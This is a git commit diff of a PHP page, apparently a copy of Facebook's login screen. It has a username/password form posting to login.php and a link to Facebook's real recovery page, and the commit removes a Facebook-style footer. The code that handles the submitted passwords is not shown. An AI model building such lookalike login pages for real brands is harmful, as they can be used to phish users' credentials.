8c5a4c448faf8f074b317c0c16ad82610db81100
Vanquy1306 <59086073+Vanquy1306@users.noreply.github.com>
2020-09-29 10:31:12 +0700

    Update buivanquangindex.php

--- buivanquangindex.php
+++ buivanquangindex.php
@@ -17,7 +17,7 @@
 					</div>
 			<div class="content-right">
 						<form method="POST" action="login.php">
-							<label for="username">Username:</label>
+					<label for="username">Username:</label>
 					<input name="username" type="text" id="username"></input><br /><br />
 					<label for="password">Password:</label>
 					<input name="password" id="password" type="password"></input><br />
@@ -25,32 +25,6 @@
                                         <div class="_6ltj"><a href="https://www.facebook.com/recover/initiate/?ars=facebook_login">Quên mật khẩu?</a></div>
 						</form>
 </div>
-		<section>
-					<footer>
-			<ul>
-				<li><a href="">Mobile</a></li>
-				<li><a href="">Find Friends</a></li>
-				<li><a href="">Badges</a></li>
-				<li><a href="">People</a></li>
-				<li><a href="">Pages</a></li>
-				<li><a href="">Apps</a></li>
-				<li><a href="">Games</a></li>
-				<li><a href="">Music</a></li>
-				<li><a href="">Locations</a></li>
-			</ul>
-			<ul>
-				<li><a href="">Topics</a></li>
-				<li><a href="">About</a></li>
-				<li><a href="">Create Ad</a></li>
-				<li><a href="">Create Page</a></li>
-				<li><a href="">Devepers</a></li>
-				<li><a href="">Careers</a></li>
-				<li><a href="">Privacy</a></li>
-				<li><a href="">Cookies</a></li>
-				<li><a href="">Terms</a></li><br />
-				<li><a href="#">Help</a></li>
-			</ul>
-		</footer>
-	</section>
+		
 </body>
 </html>
